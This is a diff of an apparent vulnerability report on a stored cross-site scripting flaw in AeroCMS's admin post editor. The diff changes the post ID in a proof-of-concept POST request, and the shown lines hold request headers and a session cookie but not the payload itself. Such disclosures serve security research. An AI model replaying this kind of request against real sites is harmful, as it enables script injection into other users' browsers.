@@ -10,7 +10,7 @@ When inserting into the database, the input is not filtered out of html characte
 Even when displaying, the entity cannot be properly encoded
 -------------------------------------------------------------
 # POC
-```c POST http://localhost:8080/AeroCMS/admin/posts.php?source=edit_post&p_id=28 HTTP/1.1
+```c POST http://localhost:8080/AeroCMS/admin/posts.php?source=edit_post&p_id=26 HTTP/1.1
 Host: localhost:8080
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
@@ -20,7 +20,7 @@ Content-Type: multipart/form-data; boundary=---------------------------854481213
 Content-Length: 1101
 Origin: http://localhost:8080
 Connection: keep-alive
-Referer: http://localhost:8080/AeroCMS/admin/posts.php?source=edit_post&p_id=28
+Referer: http://localhost:8080/AeroCMS/admin/posts.php?source=edit_post&p_id=26
 Cookie: Phpstorm-6b6ba5ee=79a50460-3b02-4cde-a5a4-ff6883c16a7b; PHPSESSID=ndh6ks953tmha1ps8cfp4bplf2
 Upgrade-Insecure-Requests: 1
 
